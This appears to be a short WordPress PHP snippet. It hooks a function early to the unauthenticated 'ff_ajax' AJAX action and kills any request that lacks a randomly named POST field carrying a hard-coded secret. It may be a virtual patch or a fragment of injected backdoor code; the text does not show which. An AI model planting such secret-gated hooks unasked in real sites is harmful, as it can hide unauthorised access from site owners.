<?php

function best_insert_csv() {
	if (!isset($_POST["yhfkudyaiskl"]) || $_POST["yhfkudyaiskl"] !== "jyTBcwXAIKcrd") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'best_insert_csv', 5, 1);
